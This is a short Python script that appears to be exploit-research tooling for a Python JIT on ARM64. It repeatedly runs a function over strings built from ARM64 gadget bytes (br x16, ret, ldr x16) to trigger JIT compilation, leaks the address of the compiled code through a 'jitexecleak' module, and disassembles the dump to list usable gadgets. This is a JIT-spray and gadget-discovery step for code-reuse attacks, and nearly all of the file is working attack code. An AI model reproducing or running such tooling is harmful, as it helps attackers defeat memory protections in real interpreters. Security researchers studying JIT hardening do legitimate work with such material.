import ctypes, jitexecleak
from capstone import *

# Capstone disassembler
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True

# Raw gadget byte sequences to spray
gadget_bytes_map = {
    "br_x16": b"\x00\x02\x1f\xd6",
    "ret":    b"\xc0\x03\x5f\xd6",
    "ldr_x16": b"\x10\x00\x00\x58",  # ldr x16, #8
}

def make_gadget_string(gadget_bytes):
    return gadget_bytes * 16  # 64 bytes of repeated gadget

def hot_func(gadget_str):
    acc = gadget_str
    for _ in range(6000):  # Ensure JIT trigger
        acc = acc.replace("AAAA", "BBBB")
    return acc

for name, raw_bytes in gadget_bytes_map.items():
    print(f"\n[== Gadget: {name} ==]")
    try:
        gadget_str = make_gadget_string(raw_bytes).decode("latin1")  # Preserve byte values
        for _ in range(10000):
            hot_func(gadget_str)

        addr = jitexecleak.leak_executor_jit(hot_func)
        print(f"[+] JIT code at 0x{addr:x}")

        # Dump and disassemble JIT code
        code = ctypes.string_at(addr, 0x1000)
        for i in md.disasm(code, addr):
            if any(mn in i.mnemonic for mn in ["br", "ret", "ldr", "mov"]):
                print(f"[GADGET] 0x{i.address:x}: {i.mnemonic:<6} {i.op_str}")

    except Exception as e:
        print(f"[-] Failed to leak or analyze JIT: {e}")
